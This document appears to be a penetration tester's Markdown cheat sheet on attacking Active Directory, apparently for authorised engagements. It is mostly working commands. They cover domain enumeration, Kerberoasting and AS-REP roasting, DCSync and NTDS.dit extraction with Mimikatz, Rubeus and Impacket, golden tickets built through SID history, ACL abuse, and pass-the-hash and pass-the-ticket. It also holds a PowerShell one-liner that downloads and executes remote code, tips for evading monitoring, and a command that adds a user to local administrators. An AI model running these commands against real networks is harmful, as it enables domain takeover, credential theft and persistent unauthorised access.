+++
title = "Active Directory"
+++

- AD Cheatsheet: https://wadcoms.github.io/
    - Filter by info currently known and by attack type like enumeration, exploitation, etc.
- https://adsecurity.org/

{{< embed-section page="Docs/2 - Pre-Engagement/checklist" header="active-directory" >}}

# Authentication Protocol Selection

| Method | Authentication Protocol | Encryption | Limitations |
| :----- | :--------------------- | :--------- | :---------- |
| **IP Address** (e.g., `192.168.1.10`) | **NTLM** | RC4, NTLMv2 | No Kerberos support, may be blocked by policies, more logging/alerting |
| **Hostname/FQDN** (e.g., `DC01.cooldomaininc.local`) | **Kerberos** (TGT/TGS) | AES-128, AES-256, RC4 | Requires DNS resolution, subject to Kerberos delegation restrictions (Double Hop problem) |

# Domain Enumeration

|          | DC Port Cheatsheet |                                                                         |
| -------- | ------------------ | ----------------------------------------------------------------------- |
| Port     | Service            | Role / Why it identifies a DC                                           |
| **53**   | **DNS**            | Almost all DCs run DNS (AD Integrated DNS).                             |
| **88**   | **Kerberos**       | **The Smoking Gun.** Only KDCs (Domain Controllers) listen here.        |
| **389**  | **LDAP**           | Directory Access. Essential for AD.                                     |
| **445**  | **SMB**            | Required for **SYSVOL** (Group Policy) replication.                     |
| **636**  | **LDAPS**          | Secure LDAP (Indicates a Certificate is installed).                     |
| **3268** | **Global Catalog** | **High Fidelity.** Indicates the server has a full index of the Forest. |
| **3269** | **GC SSL**         | Secure Global Catalog.                                                  |

```bash
sudo nmap -n -Pn -p 53,88,389,445,636,3268,3269 --open -oA dc_hunt.txt -v <TARGET>
```

{{< embed-section page="Docs/7 - Lateral Movement/Lateral Movement" header="network-info" >}}

# User Enumeration

"A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication"
- https://github.com/ropnop/kerbrute
- Username Lists
    - https://github.com/initstring/linkedin2username
    - https://github.com/insidetrust/statistically-likely-usernames
- PowerShell Tool: https://github.com/dafthack/DomainPasswordSpray

{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="user-enum" >}}

# AD Enumeration

{{< embed-section page="Docs/9 - Notes/bloodhound" header="bloodhound" >}}

## PowerShell (ADSI searcher)

Uses [System.DirectoryServices] (ADSI/LDAP) so it works from any domain-joined host without the Active Directory RSAT module.

- Ref: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher

```powershell
# Equivalent to: Get-ADDomain (defaultNamingContext) — RootDSE and default naming context (reuse $defaultNC below)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value

# Equivalent to: Get-ADDomain — Basic domain info
$domain = [ADSI]"LDAP://$defaultNC"
$domain.Name

# Equivalent to: Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName — Search for Kerberoastable accounts (requires Domain user)
# (request a TGS for a service in an attempt to crack the service's password, which its hash is used to encrypt the TGS)
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll()

# Equivalent to: Get-ADTrust — Domain trust relationships (trustedDomain objects under CN=System)
$sysNC = "CN=System," + $defaultNC
$trustSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$trustSearcher.Filter = "(objectClass=trustedDomain)"
$trustSearcher.PropertiesToLoad.Add("name") | Out-Null
$trustSearcher.FindAll()

# Equivalent to: Get-ADGroup -Filter * — Group enumeration (all group names)
$searcher.Filter = "(objectCategory=group)"
$searcher.PropertiesToLoad.Clear(); $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }

# Equivalent to: Get-ADGroup -Identity <GROUP_NAME> — Single group by name
$searcher.Filter = "(&(objectCategory=group)(samAccountName=<GROUP_NAME>))"
$searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$groupResult = $searcher.FindOne()
$groupDN = $groupResult.Properties["distinguishedname"][0]

# Equivalent to: Get-ADGroupMember -Identity <GROUP_NAME> — Group members (member attribute contains DNs)
$groupEntry = [ADSI]"LDAP://$groupDN"
$groupEntry.Properties["member"].Value
```

## PowerView (deprecated)

- Original: https://github.com/PowerShellMafia/PowerSploit
- Maintained: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

Although "dated" code-wise and heavily flagged by Security Products the underlying LDAP queries have not changed, and it is still functional.

```bash
# Enum users
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/
Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Enum Domain Admins
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Enum Domain Trusts
Get-DomainTrustMapping

# Test Admin access locally or remotely
# https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/
Test-AdminAccess -ComputerName <MACHINE>

# Kerberostable accounts
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView

.NET port of PowerView... usually has same functions and syntax. Useful when a host or network has PowerShell hardening.

## Living Off the Land (Native Binaries)

Typically, these log less and not flagged as much as pulling external tools. Especially in offline or segmented environments these can be more useful.

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="windows-defender,windows-firewall" >}}

### Initial Survey

#### DOS Version

```bash
# Am I Alone??
quser
qwinsta

# All-in-1 Info Command
systeminfo

# Hostname, Domain, DC, net interfaces, env vars
hostname
echo %USERDOMAIN%
echo %logonserver%
ipconfig /all
set
# OS Version
ver.exe
# Security Patches (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network Information
ipconfig /all
arp -a
route print
netstat -anob
netsh advfirewall show allprofiles
```

#### WMI Version

- WMIC Cheatsheet: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

```bash
# Basic Host Info
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# Basic Domain Info
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

# Security Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Process List
wmic process list /format:list

# Domain and DC Info
wmic ntdomain list /format:list

# Users on the Domain
wmic useraccount list /format:list

# Local Groups Info
wmic group list /format:list

# System Accounts Info
wmic sysaccount list /format:list
```

#### `net` Version

These could be potentially heavily monitored. Try `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

```bash
# Information about password requirements
net accounts

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "Domain Computers" /domain

# List PC accounts of domains controllers
net group "Domain Controllers" /domain

# User that belongs to the group
net group <DOMAIN_GROUP> /domain

# List of domain groups
net groups /domain

# All available groups
net localgroup

# List users that belong to the administrators group inside the domain
net localgroup administrators /domain

# Information about a group (admins)
net localgroup Administrators

# Add user to administrators
net localgroup administrators <USER> /add

# Check current shares
net share

# Get information about a user within the domain
net user /domain <USER>

# List all users of the domain
net user /domain

# Information about the current user
net user %username%

# Mount the share locally
net use Z: \\<TARGET>\<SHARE>

# Get a list of computers
net view

# Shares on the domains
net view /all /domain[:<DOMAIN>]

# List shares of a computer
net view \\<TARGET> /ALL

# List of PCs of the domain
net view /domain
```

#### `dsquery` Version

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)
- Wildcard: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
- LDAP OID: https://ldap.com/ldap-oid-reference-guide/
    - https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

Native tool to find AD objects. Only exists on hosts installed with `Active Directory Domain Services Role` and at `C:\Windows\System32\dsquery.dll`.

```bash
# Query all users or computers
dsquery user
dsquery computer

# Query filter for all users in a Domain
dsquery * "CN=Users,DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>"

# Users With Specific Attributes Set (PASSWD_NOTREQD)
# 1.2.840.113556.1.4.803:=32 means PASSWD_NOTREQD must be set
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Search DCs in Current Domain
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# Search disabled accounts
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

{{< figure src="/images/LDAP-OID-UAC-values.png" caption="User Account Control Bit Values" >}}

#### PowerShell Version

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="bypass-execution-policy" >}}

```bash
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# Pull any other tools via HTTP
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>');"
```

## Domain Trusts

```powershell
# Search for trusts (ADSI – no RSAT required)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$sysNC = "CN=System," + $defaultNC
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.FindAll()

# Or use PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain <DOMAIN> | select SamAccountName

netdom query /domain:<DOMAIN> trust

# Using netdom to query workstations and servers
netdom query /domain:<DOMAIN> workstation
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="domain-trusts" >}}

### Abusing access between Domain Trusts

- SID History: https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory
- SID Filtering: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280
    - often disabled by default to allow seamless migration
- Well-known SIDs: https://adsecurity.org/?p=1001

This normally occurs when a privileged user is migrated from one domain to another, and there is no SID filtering in place.

The following are required to do this attack via Mimikatz:
- child domain's
    - KRBTGT hash
        - (Linux) or privileged user creds that can access the domain
    - SID
    - FQDN
    - name of a target user (does not need to exist!)
- root domain's
    - SID of the Enterprise Admins group

#### via Windows

```bash
# Obtaining the KRBTGT Account's NT Hash using Mimikatz and Domain SID
.\mimikatz.exe 'lsadump::dcsync /user:<DOMAIN>\krbtgt'

## REMEMBER: above this SID is for the user... but it contains the domain/group portion. Just cut off the number after the last '-' section

Import-Module .\PowerView.ps1
Get-DomainSID

# Obtaining Enterprise Admins Group's SID using Get-DomainGroup
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid

# BEFORE: Verify no ticket
klist
ls \\<DC_FQDN>\c$

# Create GOLDEN TICKET
# NOTE: the user matters only for logging
.\mimikatz.exe 'kerberos::golden /ptt /user:<USER> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<TARGET_SID>'

# AFTER: Verify ticket creation and no access
klist
ls \\<DC_FQDN>\c$

===

# Rubeus method
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /sids:<TARGET_SID> /user:<USER> /ptt

# Then DCSYNC attack via Mimikatz
lsadump::dcsync /user:<DOMAIN>\<USER> /domain:<TARGET_DOMAIN>
```

#### via Linux

Individually...

```bash
# Performing DCSync with secretsdump.py
secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user <TARGET_DOMAIN>/krbtgt

# Domain SID
lookupsid.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> | grep "Domain SID"

# GOLDEN TICKET attack
ticketer.py -nthash <KRBTGT_HASH> -domain <TARGET_DOMAIN> -domain-sid <TARGET_DOMAIN_SID> -extra-sid <TARGET_SID> <USER>
export KRB5CCNAME="$(pwd)/<USER>.ccache"

# !!! use something like psexec to access !!!
```

...or all-in-one script, but with **GREAT CAUTION and UNDERSTANDING how this could negatively impact the target**

```bash
# NOTE: will prompt for password
raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>

# can use administrator hash from output to secretsdump.py for a user
```

# Access Control List (ACL)

- ObjectAceType Permissions: https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `AddSelf` abused with `Add-DomainGroupMember`

### Top ACL Attacks

- [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

{{< figure src="/images/ACL_attacks_graphic.png" alt="ACL Attacks" caption="by https://x.com/_nwodtuhs" >}}

### Enumerating ACLs of User

{{< embed-section page="Docs/9 - Notes/bloodhound" header="enumerating-acls-of-user" >}}

#### PowerView

```bash
# Enum ACLs of User
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <USER>
# Pay Attention to ObjectAceType and ActiveDirectoryRights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose

# Get Group Membership of User
Get-DomainGroup -Identity "<GROUP>" | select memberof

REPEAT Get-DomainObjectACL of Group
```

#### Manual

**WARNING:** These commands are very slow

```powershell
# Create list of Domain Users (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(objectCategory=user)"
$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] } | Set-Content ad_users.txt

# Iterate over users to find filtered ACL (ACL via LDAP path)
foreach($line in [System.IO.File]::ReadLines(".\ad_users.txt")) {
  $u = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
  $u.Filter = "(&(objectCategory=user)(samAccountName=$line))"
  $u.PropertiesToLoad.Add("distinguishedName") | Out-Null
  $r = $u.FindOne(); if($r) { $dn = $r.Properties["distinguishedname"][0]; Get-Acl "LDAP://$dn" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'} }
}

# Manually resolve ACL (ObjectAceType) GUIDs (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$configNC = $root.configurationNamingContext.Value
$extSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Extended-Rights,$configNC")
$extSearcher.Filter = "(objectClass=controlAccessRight)"
$extSearcher.PropertiesToLoad.Add("name") | Out-Null
$extSearcher.PropertiesToLoad.Add("displayName") | Out-Null
$extSearcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$extSearcher.PropertiesToLoad.Add("rightsGuid") | Out-Null
$extSearcher.FindAll() | Where-Object { $_.Properties["rightsguid"][0] -eq "<GUID>" }
```

## Checking Access Rights

### Remote Desktop

- https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/

```powershell
# Check if machine is RDP-able
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -GroupName "Remote Desktop Users" -ComputerName <COMPUTER_NAME>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="canrdp" >}}

### WinRM

```powershell
# Check if machine is WinRM-able
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -GroupName "Remote Management Users" -ComputerName <COMPUTER_NAME>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="canpsremote" >}}

### SQL

```powershell
# Enumerate MSSQL instances on the domain
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "<TARGET>,1433" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET>
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="sqladmin" >}}

## Domain Misconfigurations

### DNS Record Enumeration (adidnsdump)

Resolves hidden records in the DNS zone that standard enumeration misses.

```bash
# Dump all DNS records (Authenticated)
adidnsdump -vr -u <DOMAIN>\<USER> -p <PASSWORD> ldap://<DC_IP>

# Resolve unknown records (A Query)
adidnsdump -u <DOMAIN>\<USER> -p <PASSWORD> ldap://<DC_IP> -r
```

### User Attributes Mining

Hunting for passwords in descriptions and weak account configurations.

```powershell
# Find Passwords in Description Field
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Find PASSWD_NOTREQD Accounts
# Users not subject to password policy length (potential blank passwords)
# https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### SYSVOL & Group Policy Passwords

Searching for hardcoded credentials in scripts and registry preferences.

```bash
# 1. Manual Check (PowerShell)
ls \\<DC_NAME>\SYSVOL\<DOMAIN>\scripts

# 2. Automated Hunt (NetExec) - GPP Autologin & Registry
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M gpp_autologin
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M gpp_password
```

### Printer Bug Enumeration (Spooler Service)

Checks if the Print Spooler is running on the DC (required for coercion attacks like PetitPotam/PrinterBug).

```powershell
# SecurityAssessment.ps1
git clone https://github.com/itzvenom/Security-Assessment-PS && cd Security-Assessment-PS
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <DC_FQDN>
```

### Exchange Privilege Escalation

Abusing Exchange Windows Permissions group.

Reference: https://github.com/gdedrouas/Exchange-AD-Privesc

# Getting Access Credentials

## Kerberoasting (cracking TGS)

- Service Principal Names (SPN): https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names
- Event 4769 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769
- Event 4770 Logging: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4770
- Mitigation: https://adsecurity.org/?p=3458

Kerberoasting involves any valid domain user requesting a Ticket Granting Service (TGS) for an SPN. The TGS is encrypted with the service's NTLM password hash, which if a human-readable password was set, can be cracked to reveal a password. The service is often times a local administrator. The key point is this technique **must use password cracking to reveal the password; otherwise, only the TGS and an authorized user can access the service** . Hence, an uncrackable password will prove fruitless.
One must have 1 of the following:
- an account's cleartext password or NTLM hash
- a shell in the context of a domain user account (Kerberos ticket)
- SYSTEM level access on a domain-joined host

### TGS Encryption Types

- Kerberos Encryption Types: https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797

| Encryption Type | Hashcat Mode | Hash Format     | Notes                                                       |
| :-------------- | :----------- | :-------------- | :---------------------------------------------------------- |
| **RC4**         | `13100`      | `$krb5tgs$23$*` | Most common in most environments. Type 23 encrypted ticket. |
| **AES-128**     | `19600`      | `$krb5tgs$17$*` | Type 17 encrypted ticket.                                   |
| **AES-256**     | `19700`      | `$krb5tgs$18$*` | Sometimes received. Type 18 encrypted ticket.               |

#### Create Fake SPN

Create a fake SPN to Kerberoast a user. This will require proper enumeration and a vector to have the right privileges.

{{< embed-section page="Docs/6 - Post-Exploitation/nice-commands" header="change-user-password-via-powerview" >}}

```powershell
# Authenticate
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$CredSPN = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)

# Create SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -SET @{serviceprincipalname='<SPN_NAME>'} -Verbose
```

##### Cleanup

```powershell
# Remove fake SPN
Set-DomainObject -Credential $CredSPN -Identity <USER> -Clear <SPN_NAME> -Verbose
```

## Linux

### Impacket GetUserSPNs

```bash
# Enum users and collect tickets
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile spn_tickets.txt
```

### Crack TGS

```bash
# Crack TGS
hashcat -m <HASHCAT_MODE> spn_tickets.txt <WORDLIST>

# Verify via netexec
netexec smb <DC_IP> -u <USER> -p <PASSWORD>
```

## Windows

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)

#### via Rubeus

```bash
# Show Kerberoastable users
.\Rubeus.exe kerberoast /nowrap

# Show Kerberoastable admins
.\Rubeus.exe kerberoast /nowrap /ldapfilter:'admincount=1'

# Kerberoast User
# NOTE: /tgtdeleg attempts to force RC4 enc
.\Rubeus.exe kerberoast /nowrap /tgtdeleg /user:<USER>
```

**NOTE:** This RC4 downgrade does not work against a Windows Server 2019 Domain Controller. It will always return a service ticket encrypted with the highest level of encryption supported by the target account
#### via PowerView

```bash
# Enumerate SPN Accounts
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,description
```

```bash
# Get TGS for User
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

```bash
# Get ALL TGS
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation .\<OUTFILE>
```

#### via Manual Method

```bash
# REQUIRED: declare new type
Add-Type -AssemblyName System.IdentityModel

# Request and load all TGS for all SPNs into memory
# NOTE: these will need to be dumped from memory
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Dump TGS from memory
.\mimikatz.exe
base64 /out:true
kerberos::list /export

# Format Base64 TGS
echo '<TGS_BASE64>' | tr -d \\n | base64 -d > vmware.kirbi
kirbi2john vmware.kirbi > crackme.txt

# CRACK!
```

**See cracking:** [Crack TGS](#crack-tgs)

## AS-REP Roasting

When Kerberos pre-authentication is disabled, an attacker can request encrypted authentication responses without needing the user's password and later attempt offline password cracking.

### Windows

```powershell
# Enumerate Vulnerable Users (PowerView)
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Roast Specific User (Rubeus)
.\Rubeus.exe asreproast /nowrap /format:hashcat /user:<USERNAME>
```

### Linux

```bash
# Linux Alternative (Kerbrute)
# Brute-force users AND auto-check for AS-REP Roasting
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>
```

## DCSync

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync

Steals the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data, allowing an attacker to mimic a DC to retrieve user NTLM password hashes.

- REQUIRES: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` Permission
    - or `Write-Dacl` to add perm: https://bloodhound.specterops.io/resources/edges/write-dacl

### Enum via PowerView

```powershell
# Look for DS-Replication-Get-Changes-All
$sid = Convert-NameToSid <USER>
Get-ObjectAcl "DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Attack via Impacket

Remember this user must have the permissions stated above.

*   **`-just-dc-ntlm`**: Extract only NTLM hashes (skips Kerberos keys).
*   **`-just-dc-user <USERNAME>`**: Extract data for a specific user only.
*   **`-pwd-last-set`**: Display when the account's password was last changed.
*   **`-history`**: Dump password history (useful for cracking patterns).
*   **`-user-status`**: Display if the account is Enabled or Disabled.

```bash
# NOISY: Dump All
impacket-secretsdump -outputfile dcsync_hashes -just-dc <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# QUIETER: dump krbtgt for Golden Tickets
impacket-secretsdump -outputfile dcsync_hashes -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

| Output Files          | `secretsdump`  Content                                                                                                                                                                                                                                                                          | Primary Use Case                                                                        |
| :-------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------- |
| **`.ntds`**           | **NTLM Hashes**. <br>Format: `User:RID:LM:NT:::`.                                                                                                                                                                                                                                               | **Pass-the-Hash**, Offline Cracking (Hashcat Mode 1000).                                |
| **`.ntds.kerberos`**  | **Kerberos Keys** (AES-256, AES-128, DES).                                                                                                                                                                                                                                                      | **Golden Tickets** (requires `krbtgt` AES key), **Pass-the-Key** (if NTLM is disabled). |
| **`.ntds.cleartext`** | **[Plaintext Passwords](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)**. <br>Only appears for users with "Store password using reversible encryption" enabled. | **Direct Login** (RDP, WinRM). Rare but critical finding.                               |

### Attack via mimikatz

{{< embed-section page="Docs/9 - Notes/mimikatz" header="dcsync" >}}

### Manually via `NTDS.dit`

`netexec` essentially does the same thing here but remotely... so this should be a last resort method.

```bash
# Copy NTDS.dit
# NOTE: hashes in NTDS are encrypted with DPAPI key in SYSTEM
vssadmin list shadows
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Download it and impacket-secretsdump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```bash
# Same as above but easier
netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

# Escalating and Pivoting

## Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

### Preparation

```bash
# Extract AES Keys
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

### Option A: Mimikatz (Process Injection)

```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

### Option B: Rubeus (Request & Inject)

```bash
# Requests a TGT from the KDC and immediately injects it (/ptt)
# Can use /rc4 (NTLM), /aes128, or /aes256
.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
```

## Pass the Ticket (PtT)

### Windows

**Mimikatz**
```bash
# 1. Export tickets from memory to .kirbi files
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# $ : machine tickets (computers)
# @ : service tickets (users)

# 2. Inject Ticket
.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
```

**Rubeus**
```bash
# Enumerate tickets currently in session
.\Rubeus.exe triage

# Export tickets to base64 (for copy-paste)
.\Rubeus.exe dump /nowrap

# Pass from File
.\Rubeus.exe ptt /ticket:"<TICKET_FILE.kirbi>"

# Pass from Base64 String
.\Rubeus.exe ptt /ticket:"<BASE64_STRING>"

# Convert File to Base64 (PowerShell Helper)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TICKET_FILE.kirbi>"))

# Advanced: Extract & Pass John's ticket automatically (Regex One-Liner)
$raw = .\Rubeus.exe dump /user:john /nowrap | Out-String
$ticket = [Regex]::Match($raw, "(?s)Base64EncodedTicket\s*:\s*(.*)").Groups[1].Value.Trim() -replace "\s", ""
.\Rubeus.exe ptt /ticket:$ticket
```

### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
